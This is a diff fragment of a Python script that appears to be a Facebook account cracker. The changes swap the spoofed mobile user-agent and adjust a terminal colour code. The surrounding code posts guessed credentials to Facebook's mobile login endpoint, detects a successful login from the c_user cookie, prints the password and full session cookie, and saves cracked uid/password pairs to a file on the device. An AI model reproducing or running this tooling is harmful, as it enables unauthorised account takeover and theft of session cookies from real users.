@@ -197,13 +197,13 @@ def DEVHIS2(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36',}
             lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\n\033[1;92m[\033[1;31mACTIVE\x1b[0m] {uid} | {ps} \n\033[1;37mCookie:\x1b[0m {coki} \n")
+                print(f"\n\033[1;92m[\033[1;31mACTIVE\033[1;92m] {uid} | {ps} \n\033[1;37mCookie:\x1b[0m {coki} \n")
                 open('/sdcard/DEVHIS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
